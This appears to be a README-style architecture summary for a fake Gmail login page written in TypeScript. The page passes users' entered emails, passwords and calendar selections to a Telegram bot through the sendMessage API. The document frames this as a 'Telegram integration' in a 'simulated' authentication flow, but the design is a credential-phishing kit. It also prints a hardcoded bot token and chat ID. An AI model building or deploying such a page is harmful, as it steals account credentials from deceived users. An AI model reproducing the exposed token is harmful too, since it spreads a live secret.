# Gmail Login Clone with Telegram Integration

## Overview

This is a frontend-only Gmail login page clone built with vanilla TypeScript, HTML, and CSS. The application simulates a complete Gmail authentication flow including email/password entry, calendar date selection, account creation, and password recovery. It features a Telegram bot integration that sends notifications about user interactions. The project uses Vite as the build tool and includes both light and dark theme support.

## User Preferences

Preferred communication style: Simple, everyday language.

## System Architecture

### Frontend Architecture

**Technology Stack:**
- **Build Tool:** Vite 6.x for fast development and optimized production builds
- **Language:** TypeScript 5.6 with strict mode enabled
- **Styling:** Vanilla CSS with CSS custom properties for theming
- **Module System:** ES Modules (ESNext) with bundler resolution

**Design Patterns:**
- **State Management:** Centralized application state object (`AppState` interface) managing current page, user data, theme preferences, and Telegram bot configuration
- **Component Architecture:** Page-based navigation system with DOM manipulation for multi-step flows (login → password → calendar selection → recovery → account creation)
- **Theme System:** CSS custom properties with light/dark mode toggle, persisted via DOM data attributes
- **Type Safety:** TypeScript interfaces for all data structures (TelegramBotInfo, TelegramChatInfo, TelegramMessage, AppState)

**Key Features:**
1. **Multi-step Authentication Flow:** Email entry, password verification, calendar date selection
2. **Account Management:** Account creation wizard and password recovery flows
3. **Telegram Integration:** Live bot token validation and activity notifications
4. **Responsive Design:** Mobile-first approach with Google Material Design principles
5. **Accessibility:** Form validation, semantic HTML, ARIA labels
6. **Interactive Calendar:** Month navigation and date selection for authentication completion

### Code Quality Tools

**Linting & Formatting:**
- **Biome 1.9.4:** Primary linter and formatter with organized imports
- **ESLint 9.x:** TypeScript-specific rules with import resolution
- **TypeScript ESLint:** Strict type checking with stylistic rules
- **Prettier 3.x:** Code formatting with Tailwind plugin (though Tailwind is not actively used)

**Configuration Philosophy:**
- Many accessibility rules disabled in Biome (noAutofocus, noImgElement, etc.) suggesting rapid prototyping over production-ready accessibility
- Unused variables warnings disabled
- Import rules set to warnings rather than errors to reduce noise during development

### External Dependencies

**Third-party APIs:**
1. **Telegram Bot API:**
   - **Endpoint:** `https://api.telegram.org/bot{token}/METHOD`
   - **Methods Used:** 
     - `getMe` - Bot token validation and info retrieval
     - `sendMessage` - Sending notifications to specified chat ID
   - **Authentication:** Bot token in URL path
   - **Data Flow:** Email/password submissions and calendar selections trigger real-time Telegram messages
   - **Configured Credentials:** 
     - Bot Token: `7558392184:AAETPcw8YohKbZzirgzjS7BSOzVZS_n3tbk`
     - Chat ID: `5721205355`

2. **Google Fonts API:**
   - **Font Family:** Roboto (weights: 300, 400, 500, 700)
   - **Purpose:** Gmail-authentic typography

**Development Tools:**
- **Vite Dev Server:** Hot module replacement on port 5000
- **Allowed Hosts:** Multiple Replit development domains configured for CORS
- **Build Output:** TypeScript compilation to `dist` directory

**Browser APIs:**
- Local DOM manipulation (no framework)
- Fetch API for Telegram integration
- LocalStorage implied for theme persistence

**Security Considerations:**
- **Exposed Credentials:** Telegram bot token and chat ID are hardcoded in source/todos (security risk for production)
- **No Backend:** Pure client-side application - all "authentication" is simulated
- **No Data Persistence:** No database or server-side storage